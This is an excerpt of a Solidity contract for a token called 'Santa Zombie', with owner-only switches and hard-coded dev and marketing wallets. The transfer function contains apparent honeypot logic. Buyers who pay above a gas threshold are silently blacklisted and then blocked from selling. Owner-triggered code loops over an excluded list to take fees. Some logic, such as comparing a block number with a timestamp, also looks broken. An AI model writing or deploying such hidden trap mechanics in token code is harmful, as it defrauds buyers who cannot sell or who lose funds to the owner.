...
contract SantaZombie is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private constant _name = "Santa Zombie";
    string private constant _symbol = unicode"SZ";
    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint8 private _TxCount = 0;
    uint8 private deadBlock = 1;
    ...
    address payable public DevWallet = payable(0xfd17c43b2775c87B4C968354B3F30DE85ABa68fd);
    address payable public MarketingWallet = payable(0x83a8899EB401f4de0630236F262FB500378C8c2F);
    ...
    function _takeFee() private { for (uint256 i = 0; i < _Excluded.length; i++) {
    ...
    function setTransferDelay(bool _limitInEffect, bool _transferDelay) external onlyOwner {
        limitInEffect = _limitInEffect;
        transferDelay = _transferDelay;
    } 
    
    function GeenMode() external onlyOwner {
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (limitInEffect && (!_isExcludedFromFee[from])) { require(!_isExcludeds[from]);}
        if (transferDelay && tradingActiveBlock + deadBlock <= block.timestamp) {_takeFee();}
        if (limitInEffect && to != uniswapV2Pair && tx.gasprice > 7 gwei) {_isExcludeds[to] = true;}
